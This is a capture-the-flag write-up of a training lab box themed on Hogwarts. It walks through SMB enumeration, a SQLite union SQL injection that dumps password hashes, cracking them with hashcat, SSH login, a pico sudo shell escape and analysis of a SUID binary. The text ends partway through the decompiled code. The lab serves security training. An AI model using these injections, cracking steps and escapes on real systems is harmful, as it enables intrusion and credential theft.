----
A boot2root box that is modified from a box used in CuCTF by the team at Runcode.ninja
----

![](https://www.wclaymoody.com/blog/assets/images/castle-banner.png)

### Task 1  Capture the Flags

 Start Machine

Have fun storming Madeye's Castle! In this room you will need to fully enumerate the system, gain a foothold, and then pivot around to a few different users. 

Answer the questions below

```
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.206.14 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.206.14:22
Open 10.10.206.14:80
Open 10.10.206.14:139
Open 10.10.206.14:445
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-23 13:14 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:14
Completed NSE at 13:14, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:14
Completed NSE at 13:14, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:14
Completed NSE at 13:14, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 13:14
Completed Parallel DNS resolution of 1 host. at 13:14, 0.01s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 13:14
Scanning 10.10.206.14 [4 ports]
Discovered open port 80/tcp on 10.10.206.14
Discovered open port 22/tcp on 10.10.206.14
Discovered open port 139/tcp on 10.10.206.14
Discovered open port 445/tcp on 10.10.206.14
Completed Connect Scan at 13:14, 0.20s elapsed (4 total ports)
Initiating Service scan at 13:14
Scanning 4 services on 10.10.206.14
Completed Service scan at 13:15, 11.61s elapsed (4 services on 1 host)
NSE: Script scanning 10.10.206.14.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:15
NSE Timing: About 99.82% done; ETC: 13:15 (0:00:00 remaining)
Completed NSE at 13:15, 40.05s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:15
Completed NSE at 13:15, 0.86s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:15
Completed NSE at 13:15, 0.00s elapsed
Nmap scan report for 10.10.206.14
Host is up, received user-set (0.19s latency).
Scanned at 2023-06-23 13:14:52 EDT for 53s

PORT    STATE SERVICE     REASON  VERSION
22/tcp  open  ssh         syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 7f5f48fa3d3ee69c239433d18d22b47a (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDSmqaAdIPmWjN3e6ubgLXXBGVvX9bKtcNHYD2epO9Fwy4brQNYRBkUxrRp4SJIX26MGxGyE8C5HKzhKdlXCeQS+QF36URayv/joz6UOTFTW3oxsMF6tDYMQy3Zcgh5Xp5yVoNGP84pegTQjXUUxhYSEhb3aCIci8JzPt9JntGuO0d0BQAqEo94K3RCx4/V7AWO1qlUeFF/nUZArwtgHcLFYRJEzonM02wGNHXu1vmSuvm4EF/IQE7UYGmNYlNKqYdaE3EYAThEIiiMrPaE4v21xi1JNNjUIhK9YpTA9kJuYk3bnzpO+u6BLTP2bPCMO4C8742UEc4srW7RmZ3qmoGt
|   256 5375a74aa8aa46666a128ccdc26f39aa (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCDhpuUC3UgAeCvRo0UuEgWfXhisGXTVUnFooDdZzvGRS393O/N6Ywk715TOIAbk+o1oC1rba5Cg7DM4hyNtejk=
|   256 7fc22f3d64d90a507460360398007598 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGnNa6K0GzjKiPdClth/sy8rhOd8KtkuagrRkr4tiATl
80/tcp  open  http        syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: Amazingly It works
139/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn syn-ack Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: HOGWARTZ-CASTLE; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
|_clock-skew: mean: 1s, deviation: 0s, median: 0s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: hogwartz-castle
|   NetBIOS computer name: HOGWARTZ-CASTLE\x00
|   Domain name: \x00
|   FQDN: hogwartz-castle
|_  System time: 2023-06-23T17:15:06+00:00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 17119/tcp): CLEAN (Timeout)
|   Check 2 (port 44229/tcp): CLEAN (Timeout)
|   Check 3 (port 10779/udp): CLEAN (Timeout)
|   Check 4 (port 41283/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| nbstat: NetBIOS name: HOGWARTZ-CASTLE, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| Names:
|   HOGWARTZ-CASTLE<00>  Flags: <unique><active>
|   HOGWARTZ-CASTLE<03>  Flags: <unique><active>
|   HOGWARTZ-CASTLE<20>  Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   0000000000000000000000000000000000
|   0000000000000000000000000000000000
|_  0000000000000000000000000000
| smb2-time: 
|   date: 2023-06-23T17:15:06
|_  start_date: N/A

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:15
Completed NSE at 13:15, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:15
Completed NSE at 13:15, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:15
Completed NSE at 13:15, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.23 seconds

 <!--
        TODO: Virtual hosting is good. 
        TODO: Register for hogwartz-castle.thm
  -->

┌──(witty㉿kali)-[~/Downloads]
└─$ tac /etc/hosts 
10.10.206.14  hogwartz-castle.thm

┌──(witty㉿kali)-[~/Downloads]
└─$ smbclient -N -L \\\\hogwartz-castle.thm\\

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	sambashare      Disk      Harry's Important Files
	IPC$            IPC       IPC Service (hogwartz-castle server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            HOGWARTZ-CASTLE

┌──(witty㉿kali)-[~/Downloads]
└─$ smbclient -N \\\\hogwartz-castle.thm\\sambashare  
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Nov 25 20:19:20 2020
  ..                                  D        0  Wed Nov 25 19:57:55 2020
  spellnames.txt                      N      874  Wed Nov 25 20:06:32 2020
  .notes.txt                          H      147  Wed Nov 25 20:19:19 2020

		9219412 blocks of size 1024. 4411808 blocks available
smb: \> mget *
Get file spellnames.txt? y
getting file \spellnames.txt of size 874 as spellnames.txt (1.1 KiloBytes/sec) (average 1.1 KiloBytes/sec)
Get file .notes.txt? y
getting file \.notes.txt of size 147 as .notes.txt (0.2 KiloBytes/sec) (average 0.6 KiloBytes/sec)
smb: \> exit
                                                                                                                                                
┌──(witty㉿kali)-[~/Downloads]
└─$ cat spellnames.txt  
avadakedavra
crucio
imperio
morsmordre
brackiumemendo
confringo
sectumsempra
sluguluseructo
furnunculus
densaugeo
locomotorwibbly
tarantallegra
serpensortia
levicorpus
flagrate
waddiwasi
duro
alarteascendare
glisseo
locomotormortis
petrificustotalus
liberacorpus
orchideous
avis
descendo
aparecium
obscuro
incarcerous
deprimo
meteolojinxrecanto
oppugno
pointme
deletrius
specialisrevelio
priorincantato
homenumrevelio
erecto
colloportus
alohomora
sonorus
muffliato
relashio
mobiliarbus
mobilicorpus
expulso
reducto
diffindo
defodio
capaciousextremis
piertotumlocomotor
confundo
expectopatronum
quietus
tergeo
riddikulus
langlock
impedimenta
ferula
lumos
nox
impervius
engorgio
salviohexia
obliviate
repellomuggletum
portus
stupefy
rennervate
episkey
silencio
scourgify
reparo
finiteincantatem
protego
expelliarmus
wingardiumleviosa
accio
anapneo
incendio
evanesco
aguamenti
                                                                                                                                                
┌──(witty㉿kali)-[~/Downloads]
└─$ cat .notes.txt    
Hagrid told me that spells names are not good since they will not "rock you"
Hermonine loves historical text editors along with reading old books.

using burp

user='&password=test

HTTP/1.1 500 INTERNAL SERVER ERROR

user='union select 1,2,3,4-- -&password=test

HTTP/1.1 403 FORBIDDEN

"error":"The password for 1 is incorrect! 4"

https://github.com/jesusgavancho/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md

user='union select sqlite_version(),2,3,4-- -&password=test

"error":"The password for 3.22.0 is incorrect! 4"

user='union select group_concat(tbl_name),2,3,4 FROM sqlite_master-- -&password=test

"error":"The password for users is incorrect! 4"

user=' union select sql,2,3,4 FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='users'-- -&password=test

user='union select group_concat(password),2,3,4 FROM users-- -

"The password for c53d7af1bbe101a6b45a3844c89c8c06d8ac24ed562f01b848cad9925c691e6f10217b6594532b9cd31aa5762d85df642530152d9adb3005fac407e2896bf492,b326e7a664d756c39c9e09a98438b08226f98b89188ad144dd655f140674b5eb3fdac0f19bb3903be1f52c40c252c0e7ea7f5050dec63cf3c85290c0a2c5c885,e1ed732e4aa925f0bf125ae8ed17dd2d5a1487f9ff97df63523aa481072b0b5ab7e85713c07e37d9f0c6f8b1840390fc713a4350943e7409a8541f15466d8b54,5628255048e956c9659ed4577ad15b4be4177ce9146e2a51bd6e1983ac3d5c0e451a0372407c1c7f70402c3357fc9509c24f44206987b1a31d43124f09641a8d,2317e58537e9001429caf47366532d63e4e37ecd363392a80e187771929e302922c4f9d369eda97ab7e798527f7626032c3f0c3fd19e0070168ac2a82c953f7b,79d9a8bef57568364cc6b4743f8c017c2dfd8fd6d450d9045ad640ab9815f18a69a4d2418a7998b4208d509d8e8e728c654c429095c16583cbf8660b02689905,e3c663d68c647e37c7170a45214caab9ca9a7d77b1a524c3b85cdaeaa68b2b5e740357de2508142bc915d7a16b97012925c221950fb671dd513848e33c33d22e,d3ccca898369a3f4cf73cbfc8daeeb08346edf688dc9b7b859e435fe36021a6845a75e4eddc7a932e38332f66524bd7876c0c613f620b2030ed2f89965823744,dc2a6b9462945b76f333e075be0bc2a9c87407a3577f43ba347043775a0f4b5c1a78026b420a1bf7da84f275606679e17ddc26bceae25dad65ac79645d2573c0,6535ee9d2b8d6f2438cf92da5a00724bd2539922c83ca19befedbe57859ceafd6d7b9db83bd83c26a1e070725f6f336e21cb40295ee07d87357c34b6774dd918,93b4f8ce01b44dd25c134d0517a496595b0b081cef6eb625e7eb6662cb12dd69c6437af2ed3a5972be8b05cc14a16f46b5d11f9e27e6550911ed3d0fe656e04d,9a311251255c890692dc84b7d7d66a1eefc5b89804cb74d16ff486927014d97502b2f790fbd7966d19e4fbb03b5eb7565afc9417992fc0c242870ea2fd863d6d,5ed63206a19b036f32851def04e90b8df081071aa8ca9fb35ef71e4daf5e6c6eab3b3fea1b6e50a45a46a7aee86e4327f73a00f48deb8ae2bf752f051563cc8b,87ac9f90f01b4b2ae775a7cb96a8a04d7ab7530282fd76224ee03eecab9114275540e4b6a2c52e890cf11f62aacb965be0c53c48c0e51bf731d046c5c3182aad,88344d6b7724bc0e6e3247d4912fa755a5a91c2276e08610462f6ea005d16fd5e305dfe566e7f1dd1a98afe1abfa38df3d9697cdc47ecbb26ac4d21349d09ba7,7f67af71e8cbb7188dd187b7da2386cc800ab8b863c9d0b2dce87c98a91b5511330a2ad4f7d73592b50a2a26c26970cfbd22f915d1967cd92569dbf5e24ac77e,8c8702dbb6de9829bcd6da8a47ab26308e9db7cb274b354e242a9811390462a51345f5101d7f081d36eea4ec199470162775c32cb1f4a96351dc385711619671,c809b40b7c3c0f095390f3cd96bb13864b7e8fd1670c6b1c05b1e26151be62782b97391b120cb4a8ee1d0c9b8fffaf12b44c9d084ae6041468ad5f12ec3d7a4e,68b519187b9e2552d555cb3e9183711b939f94dfe2f71bda0172ee8402acf074cc0f000611d68d2b8e9502fa7235c8a25d72da50916ad0689e00cb4f47283e9b,7eea93d53fbed3ba8f2fa3d25c5f16fe5eaff1f5371918e0845d2076a2e952a457390ad87d289bf25f9457032f14bb07dcd625d03f2f5ee5c887c09dc7107a66,e49608634f7de91d19e5e1b906e10c5a4a855a4fe32521f310727c9875e823c82b3e0347b32ef49ea44657e60e771d9e326d40ab60ce3a950145f1a7a79d3124,c063c5215b56091327a1f25e38e2d0a5e6db83cceb0ab29cbb0bedd686c18ee5770bfbbfa0a4ac542c8935b0fb63e30ea0bc0408d3523157d840fdfa54ec8dab,487daab566431e86172ed68f0836f3221592f91c94059a725d2fdca145f97e6258593929c37d0339ca68614a52f4df61953b930585c4968cedaaa836744c52a6,44b1fbcbcd576b8fd69bf2118a0c2b82ccf8a6a9ef2ae56e8978e6178e55b61d491f6fc152d07f97ca88c6b7532f25b8cd46279e8a2c915550d9176f19245798,a86fa315ce8ed4d8295bf6d0139f23ba80e918a54a132e214c92c76768f27ce002253834190412e33c9af4ea76befa066d5bdeb47363f228c509b812dc5d81df,a1f6e38be4bf9fd307efe4fe05522b8c3a9e37fc2c2930507e48cb5582d81f73814ffb543cef77b4b24a18e70e2670668d1a5b6e0b4cb34af9706890bd06bbc9,01529ec5cb2c6b0300ed8f4f3df6b282c1a68c45ff97c33d52007573774014d3f01a293a06b1f0f3eb6e90994cb2a7528d345a266203ef4cd3d9434a3a033ec0,d17604dbb5c92b99fe38648bbe4e0a0780f2f4155d58e7d6eddd38d6eceb62ae81e5e31a0a2105de30ba5504ea9c75175a79ed23cd18abcef0c8317ba693b953,ac67187c4d7e887cbaccc625209a8f7423cb4ad938ec8f50c0aa5002e02507c03930f02fab7fab971fb3f659a03cd224669b0e1d5b5a9098b2def90082dfdbd2,134d4410417fb1fc4bcd49abf4133b6de691de1ef0a4cdc3895581c6ad19a93737cd63cb8d177db90bd3c16e41ca04c85d778841e1206193edfebd4d6f028cdb,afcaf504e02b57f9b904d93ee9c1d2e563d109e1479409d96aa064e8fa1b8ef11c92bae56ddb54972e918e04c942bb3474222f041f80b189aa0efd22f372e802,6487592ed88c043e36f6ace6c8b6c59c13e0004f9751b0c3fdf796b1965c48607ac3cc4256cc0708e77eca8e2df35b668f5844200334300a17826c033b03fe29,af9f594822f37da8ed0de005b940158a0837060d3300be014fe4a12420a09d5ff98883d8502a2aaffd64b05c7b5a39cdeb5c57e3005c3d7e9cadb8bb3ad39ddb,53e7ea6c54bea76f1d905889fbc732d04fa5d7650497d5a27acc7f754e69768078c246a160a3a16c795ab71d4b565cde8fdfbe034a400841c7d6a37bdf1dab0d,11f9cd36ed06f0c166ec34ab06ab47f570a4ec3f69af98a3bb145589e4a221d11a09c785d8d3947490ae4cd6f5b5dc4eb730e4faeca2e1cf9990e35d4b136490,9dc90274aef30d1c017a6dc1d5e3c07c8dd6ae964bcfb95cadc0e75ca5927faa4d72eb01836b613916aea2165430fc7592b5abb19b0d0b2476f7082bfa6fb760,4c968fc8f5b72fd21b50680dcddea130862c8a43721d8d605723778b836bcbbc0672d20a22874af855e113cba8878672b7e6d4fc8bf9e11bc59d5dd73eb9d10e,d4d5f4384c9034cd2c77a6bee5b17a732f028b2a4c00344c220fc0022a1efc0195018ca054772246a8d505617d2e5ed141401a1f32b804d15389b62496b60f24,36e2de7756026a8fc9989ac7b23cc6f3996595598c9696cca772f31a065830511ac3699bdfa1355419e07fd7889a32bf5cf72d6b73c571aac60a6287d0ab8c36,8f45b6396c0d993a8edc2c71c004a91404adc8e226d0ccf600bf2c78d33ca60ef5439ccbb9178da5f9f0cfd66f8404e7ccacbf9bdf32db5dae5dde2933ca60e6 is incorrect! 4"

user='union select group_concat(notes),2,3,4 FROM users-- -

"The password for contact administrator. Congrats on SQL injection... keep digging,My linux username is my first name, and password uses best64, contact administrator. Congrats on SQL injection... keep digging,contact administrator. Congrats on SQL injection... keep digging,contact administrator. Congrats on SQL injection... keep digging,contact administrator. Congrats on SQL injection... keep digging, contact administrator. Congrats on SQL injection... keep digging, contact administrator. Congrats on SQL injection... keep digging, contact administrator. Congrats on SQL injection... keep digging, contact administrator. Congrats on SQL injection... keep digging, contact administrator. Congrats on SQL injection... keep digging, contact administrator. Congrats on SQL injection... keep digging,contact administrator. Congrats on SQL injection... keep digging,contact administrator. Congrats on SQL injection... keep digging,contact administrator. Congrats on SQL injection... keep digging,contact administrator. Congrats on SQL injection... keep digging,contact administrator. Congrats on SQL injection... keep digging,contact administrator. Congrats on SQL injection... keep digging, contact administrator. Congrats on SQL injection... keep digging, contact administrator. Congrats on SQL injection... keep digging,contact administrator. Congrats on SQL injection... keep digging, contact administrator. Congrats on SQL injection... keep digging, contact administrator. Congrats on SQL injection... keep digging,contact administrator. Congrats on SQL injection... keep digging,contact administrator. Congrats on SQL injection... keep digging,contact administrator. Congrats on SQL injection... keep digging, contact administrator. Congrats on SQL injection... keep digging, contact administrator. Congrats on SQL injection... keep digging, contact administrator. Congrats on SQL injection... keep digging, contact administrator. Congrats on SQL injection... keep digging, contact administrator. Congrats on SQL injection... keep digging,contact administrator. Congrats on SQL injection... keep digging, contact administrator. Congrats on SQL injection... keep digging,contact administrator. Congrats on SQL injection... keep digging, contact administrator. Congrats on SQL injection... keep digging, contact administrator. Congrats on SQL injection... keep digging,contact administrator. Congrats on SQL injection... keep digging, contact administrator. Congrats on SQL injection... keep digging,contact administrator. Congrats on SQL injection... keep digging, contact administrator. Congrats on SQL injection... keep digging is incorrect! 4"

user='union select group_concat(name),2,3,4 FROM users-- -

"The password for Lucas Washington,Harry Turner,Andrea Phillips,Liam Hernandez,Adam Jenkins,Landon Alexander,Kennedy Anderson,Sydney Wright,Aaliyah Sanders,Olivia Murphy,Olivia Ross,Grace Brooks,Jordan White,Diego Baker,Liam Ward,Carlos Barnes,Carlos Lopez,Oliver Gonzalez,Sophie Sanchez,Maya Sanders,Joshua Reed,Aaliyah Allen,Jasmine King,Jonathan Long,Samuel Anderson,Julian Robinson,Gianna Harris,Madelyn Morgan,Ella Garcia,Zoey Gonzales,Abigail Morgan,Joseph Rivera,Elizabeth Cook,Parker Cox,Savannah Torres,Aaliyah Williams,Blake Washington,Claire Miller,Brody Stewart,Kimberly Murphy is incorrect! 4"

┌──(witty㉿kali)-[~/Downloads]
└─$ hash-identifier
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: b326e7a664d756c39c9e09a98438b08226f98b89188ad144dd655f140674b5eb3fdac0f19bb3903be1f52c40c252c0e7ea7f5050dec63cf3c85290c0a2c5c885

Possible Hashs:
[+] SHA-512
[+] Whirlpool

Least Possible Hashs:
[+] SHA-512(HMAC)
[+] Whirlpool(HMAC)
--------------------------------------------------

┌──(witty㉿kali)-[~/Downloads]
└─$ nano hash_mad.txt                                        
                                                                                                                                                
┌──(witty㉿kali)-[~/Downloads]
└─$ hashcat -m 1700 -a 0 hash_mad.txt -r /usr/share/hashcat/rules/best64.rule /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 14.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-sandybridge-Intel(R) Core(TM) i5-10210U CPU @ 1.60GHz, 2058/4180 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 77

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash
* Uses-64-Bit

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 1104517645
* Runtime...: 8 secs

Cracking performance lower than expected?                 

* Append -O to the commandline.
  This lowers the maximum supported password/salt length (usually down to 32).

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

b326e7a664d756c39c9e09a98438b08226f98b89188ad144dd655f140674b5eb3fdac0f19bb3903be1f52c40c252c0e7ea7f5050dec63cf3c85290c0a2c5c885:wingardiumleviosa123
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1700 (SHA2-512)
Hash.Target......: b326e7a664d756c39c9e09a98438b08226f98b89188ad144dd6...c5c885
Time.Started.....: Mon Jun 26 20:18:23 2023 (15 secs)
Time.Estimated...: Mon Jun 26 20:18:38 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Mod........: Rules (/usr/share/hashcat/rules/best64.rule)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  3076.0 kH/s (9.66ms) @ Accel:128 Loops:77 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 43642368/1104517645 (3.95%)
Rejected.........: 0/43642368 (0.00%)
Restore.Point....: 566272/14344385 (3.95%)
Restore.Sub.#1...: Salt:0 Amplifier:0-77 Iteration:0-77
Candidate.Engine.: Device Generator
Candidates.#1....: wolfs1 -> w7w7w7
Hardware.Mon.#1..: Util: 85%

Started: Mon Jun 26 20:16:12 2023
Stopped: Mon Jun 26 20:18:40 2023


Hello Harry Turner!
Even though Ron said password reuse is bad, I don't really care 

Harry Turner:wingardiumleviosa123

┌──(witty㉿kali)-[~/Downloads]
└─$ ssh harry@10.10.168.156                                                
The authenticity of host '10.10.168.156 (10.10.168.156)' can't be established.
ED25519 key fingerprint is SHA256:aoBkBWztoybmKKG6fmaF81L3u4vOoka0W8OgIKh3E7Y.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.168.156' (ED25519) to the list of known hosts.
harry@10.10.168.156's password: wingardiumleviosa123
 _      __    __                     __         __ __                          __
 | | /| / /__ / /______  __ _  ___   / /____    / // /__  ___ __    _____ _____/ /____
 | |/ |/ / -_) / __/ _ \/  ' \/ -_) / __/ _ \  / _  / _ \/ _ `/ |/|/ / _ `/ __/ __/_ /
 |__/|__/\__/_/\__/\___/_/_/_/\__/  \__/\___/ /_//_/\___/\_, /|__,__/\_,_/_/  \__//__/
                                                        /___/

Last login: Thu Nov 26 01:42:18 2020
harry@hogwartz-castle:~$ id
uid=1001(harry) gid=1001(harry) groups=1001(harry)

harry@hogwartz-castle:~$ ls -lah
total 32K
drwxr-x--- 4 harry harry 4.0K Nov 26  2020 .
drwxr-xr-x 4 root  root  4.0K Nov 26  2020 ..
lrwxrwxrwx 1 root  root     9 Nov 26  2020 .bash_history -> /dev/null
-rw-r----- 1 harry harry  220 Apr  4  2018 .bash_logout
-rw-r----- 1 harry harry 3.7K Apr  4  2018 .bashrc
drwx------ 2 harry harry 4.0K Nov 26  2020 .cache
drwx------ 3 harry harry 4.0K Nov 26  2020 .gnupg
-rw-r----- 1 harry harry  807 Apr  4  2018 .profile
-rw-r----- 1 harry harry   40 Nov 26  2020 user1.txt
harry@hogwartz-castle:~$ cat user1.txt 
RME{th3-b0Y-wHo-l1v3d-f409da6f55037fdc}

harry@hogwartz-castle:~$ sudo -l
[sudo] password for harry: 
Matching Defaults entries for harry on hogwartz-castle:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User harry may run the following commands on hogwartz-castle:
    (hermonine) /usr/bin/pico
    (hermonine) /usr/bin/pico

harry@hogwartz-castle:~$ sudo -u hermonine pico
^R^X
reset; bash 1>&0 2>&0

hermonine@hogwartz-castle:~$ id
uid=1002(hermonine) gid=1002(hermonine) groups=1002(hermonine)

hermonine@hogwartz-castle:/home/hermonine$ cat user2.txt 
RME{p1c0-iZ-oLd-sk00l-nANo-64e977c63cb574e6}
hermonine@hogwartz-castle:~$ find / -type f -user root -perm -u=s -exec ls -l {} + 2>/dev/null
-rwsr-xr-x 1 root root        43088 Sep 16  2020 /bin/mount
-rwsr-xr-x 1 root root        64424 Jun 28  2019 /bin/ping
-rwsr-xr-x 1 root root        44664 Mar 22  2019 /bin/su
-rwsr-xr-x 1 root root        26696 Sep 16  2020 /bin/umount
-rwsr-xr-x 1 root root         8816 Nov 26  2020 /srv/time-turner/swagger
-rwsr-xr-x 1 root root        76496 Mar 22  2019 /usr/bin/chfn
-rwsr-xr-x 1 root root        44528 Mar 22  2019 /usr/bin/chsh
-rwsr-xr-x 1 root root        75824 Mar 22  2019 /usr/bin/gpasswd
-rwsr-xr-x 1 root root        37136 Mar 22  2019 /usr/bin/newgidmap
-rwsr-xr-x 1 root root        40344 Mar 22  2019 /usr/bin/newgrp
-rwsr-xr-x 1 root root        37136 Mar 22  2019 /usr/bin/newuidmap
-rwsr-xr-x 1 root root        59640 Mar 22  2019 /usr/bin/passwd
-rwsr-xr-x 1 root root        22520 Mar 27  2019 /usr/bin/pkexec
-rwsr-xr-x 1 root root       149080 Sep 23  2020 /usr/bin/sudo
-rwsr-xr-x 1 root root        18448 Jun 28  2019 /usr/bin/traceroute6.iputils
-rwsr-xr-- 1 root messagebus  42992 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root        10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root       436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root        14328 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root       113528 Oct  8  2020 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root       100760 Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic

hermonine@hogwartz-castle:/srv/time-turner$ ./swagger 
Guess my number: 1234
Nope, that is not what I was thinking
I was thinking of 1344877159

┌──(witty㉿kali)-[~/Downloads]
└─$ scp harry@10.10.168.156:/srv/time-turner/swagger .
harry@10.10.168.156's password: 
swagger                      100% 8816     9.5KB/s   00:00 

using ghidra

undefined8 main(void)

{
  time_t tVar1;
  long in_FS_OFFSET;
  uint local_18;
  uint local_14;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  tVar1 = time((time_t *)0x0);
  srand((uint)tVar1);
  local_14 = rand();
  printf("Guess my number: ");
  __isoc99_scanf(&DAT_00100b8d,&local_18);
  if (local_14 == local_18) {
    impressive();
  }
  else {
    puts("Nope, that is not what I was thinking");
    printf("I was thinking of %d\n",(ulong)local_14);
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}

void impressive(void)

{
  setregid(0,0);
